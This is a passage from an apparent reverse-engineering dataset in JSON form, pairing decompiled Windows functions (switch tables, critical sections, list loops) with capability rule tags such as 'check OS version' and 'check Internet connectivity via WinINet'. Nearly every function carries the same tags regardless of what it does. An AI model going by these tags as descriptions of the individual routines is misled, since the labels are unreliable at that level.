break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6c4(var_28h);\n        fcn.00405dc8(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6c4(var_28h);\n        fcn.00405dc8(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414700(var_24h, *(param_2 + 6));\n        fcn.00405c84();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414738(var_24h, *(param_2 + 6));\n        fcn.00405c84();\n        break;\n    case 8:\n        var_24h = 0x415295;\n        var_14h = &stack0xfffffffc;\n        fcn.00405e78(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00414f2c();\n        fcn.00405c84();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405dc8();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00414fe4();\n            fcn.00405c84();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405c48();\n            cVar2 = fcn.00415048();\n            if (cVar2 == '\\0') {\n                fcn.00414f2c();\n                fcn.00405c84();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4153c4\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00414f2c();\n                fcn.00405c84();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.00405dc8();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.00405dc8();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6c4(var_28h);\n                fcn.00405dc8(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6c4(var_28h);\n                fcn.00405dc8(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414700(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405c84();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414738(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405c84();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405d8c();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.00414770();\n                fcn.00405c84();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.00415110();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.00405dc8();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.00405dc8();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.00405dc8();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409dd4(var_24h);\n                fcn.00405dc8(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409dd4(var_24h);\n                fcn.00405dc8(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.00414770();\n        fcn.00405c84();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.00415110();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.00405dc8();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.00405dc8();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.00405dc8();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00409dd4(var_24h);\n        fcn.00405dc8(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00409dd4(var_24h);\n        fcn.00405dc8(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41565c;\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2590
    },
    "004157a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004157a8(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.004070f8(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x490a54 != '\\0') {\n            fcn.00410e04();\n        }\n        fcn.004070f8(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.00407110();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.00407110();\n    }\n    else {\n        cVar2 = fcn.00416124();\n        if (cVar2 != '\\0') {\n            fcn.004070f8(param_1);\n            cVar2 = fcn.004046f4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e04();\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "00415854": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415854(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0041156c();\n    }\n    if (*0x490a5c == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x490a70);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 129
    },
    "00415e80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415e80(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x497994;\n    puStack20 = 0x415e94;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x415ee1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.00406858();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x497990 + iVar1 * 4) != *0x490a64) {\n                fcn.00404640();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x415ee8;\n    uStack24 = 0x497994;\n    uStack28 = 0x415ee0;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 276
    },
    "00416124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00416124(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x497990 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x497994;\n        puStack28 = 0x41615f;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x4161cc;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00416124::var_1h + 1;\n        iVar2 = fcn.00406858();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x497990 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x4161d3;\n        uStack32 = 0x497994;\n        uStack36 = 0x4161cb;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 375
    },
    "004164dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004164dc(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00409e54();\n        return uVar2;\n    }\n    iVar3 = fcn.00416484();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.004099fc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.004099fc();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00409e54();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.00416490();\n    }\n    return uVar2;\n}\n",
        "token_count": 212
    },
    "004165b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004165b0(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 398
    },
    "00419f74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419f74(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00419f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419f94(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00420024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420024(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00420044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420044(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00418508": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418508(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.004184a8();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.004184a8();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.0040486c();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00418578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00418578(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.00419680();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 195
    },
    "004186c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004186c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x418770;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00404520();\n    fcn.004056d0();\n    iVar1 = fcn.00418614();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040db68(0, &var_10ch);\n        fcn.00404eb4();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00404610();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.00419680();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x418777;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 350
    },
    "004187c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004187c4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.004197d8();\n            cVar1 = fcn.004187a4();\n            if (cVar1 != '\\0') {\n                fcn.004196cc();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.004197d8();\n            cVar1 = fcn.004187a4();\n            if (cVar1 != '\\0') {\n                fcn.004196cc();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.004187a4();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "004189d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004189d4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004197d8();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.00418614();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "00418aa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418aa8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00418990();\n    if (iVar2 == 0) {\n        fcn.00418a18(&stack0xfffffffc);\n    }\n    fcn.0041849c();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.004197d8();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.004197d8();\n                    cVar1 = fcn.0040486c();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.00418990(),  iVar4 == iVar2)) {\n                        fcn.004196cc();\n                        fcn.00419680();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00418c38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418c38(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.004197d8();\n            fcn.004187c4();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00404640();\n                fcn.004196cc();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00418c88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418c88(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x418c9d;\n        in_EAX = fcn.00404964();\n    }\n    puStack48 = 0x418cb0;\n    fcn.00404610();\n    puStack48 = 0x418cbc;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x418ccc;\n    fcn.00418b74();\n    uStack52 = 0x418d87;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x4979c4 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.004197d8();\n            cVar2 = fcn.0041867c();\n            if (cVar2 != '\\0') {\n                fcn.00419680();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x4979c4 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.004197d8();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.00419680();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x418d8e;\n    uStack52 = 0x418d86;\n    fcn.00418c2c();\n    return;\n}\n",
        "token_count": 547
    },
    "00418de4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00418de4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x418e01;\n    fcn.00418b74();\n    uStack32 = 0x418e5b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004197d8();\n            iVar1 = fcn.00418614();\n            if (iVar1 != 0) {\n                fcn.00404f60();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x418e62;\n    uStack32 = 0x418e5a;\n    iVar2 = fcn.00418c2c();\n    return iVar2;\n}\n",
        "token_count": 298
    },
    "004191cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
